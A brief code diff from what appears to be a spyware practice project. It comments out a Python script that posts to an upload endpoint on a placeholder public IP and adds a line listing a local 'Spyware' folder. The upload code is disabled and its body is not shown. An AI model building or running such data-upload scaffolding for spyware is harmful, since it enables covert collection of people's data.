@@ -1,3 +1,4 @@
+'''
 import requests
 
 UPLOAD_URL = "http://<publicIP>:5000/upload"
@@ -13,3 +14,8 @@ try:
 
 except Exception as e:
     print("Error:", e)
+'''
+
+import os
+
+print(os.listdir('D:\code\marvel\Level-2-\Docker-spy\Spyware'))
